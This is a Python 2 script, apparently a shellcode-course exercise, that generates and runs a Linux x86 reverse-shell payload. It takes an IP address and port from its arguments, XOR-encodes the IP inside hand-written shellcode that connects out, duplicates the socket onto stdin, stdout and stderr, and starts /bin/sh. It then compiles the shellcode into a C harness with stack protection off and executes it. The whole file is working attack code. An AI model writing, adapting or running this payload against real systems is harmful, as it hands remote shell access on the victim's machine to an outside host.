import os
import sys
import commands
import struct
import re

key = 0xaaaaaaaa
ip = sys.argv[1].split(".") # xored with 0xaaaaaaaa : 127.0.0.1 : 0x100007f ^ 0xaaaaaaaa = 0xabaaaad5
ip_hex = ""

for val in ip[::-1]:
	if(hex(int(val))[2:] == "0"):
		ip_hex += hex(int(val))[2:] + "0"
	else:
		ip_hex += hex(int(val))[2:]

ip_hex = int("0x" + ip_hex, 16)
ip_hex = re.findall('..',hex(ip_hex ^ key).replace("0x",""))
ip = ""
for hex in ip_hex[::-1]:
	ip += "\\x" + hex
xored_ip = ip

port = ""
port_hex = re.findall('..', struct.pack('>L',int(sys.argv[2])).encode('hex')[4:]) # "\\x22\\xb8" port 8888
for hex in port_hex:
	port += "\\x" + hex

shellcode = "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02" \
			"\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb8\\xaa\\xaa\\xaa\\xaa\\xbb" + xored_ip + "\\x31\\xd8" \
			"\\x50\\x66\\x68" + port + "\\x66\\x6a\\x02\\x89\\xe1\\x31\\xc0\\x31\\xdb" \
			"\\xb0\\x66\\xb3\\x03\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb0\\x3f" \
			"\\x57\\xcd\\x80\\xb0\\x3f\\xb1\\x01\\x57\\xcd\\x80\\xb0\\x3f\\xb1\\x02\\x57\\xcd" \
			"\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" \
			"\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\""

f = open("shellcode.c", "w")
f.write("#include<stdio.h>\n\
#include<string.h>\n\
unsigned char code[] = \\\n\
"+ shellcode + ";\n\
main(){\n\
\tint (*ret)() = (int(*)())code;\n\
\tret();\n\
}")
f.close()

print "[*] Running the shellcode"
commands.getstatusoutput("gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode")
os.system("./shellcode")
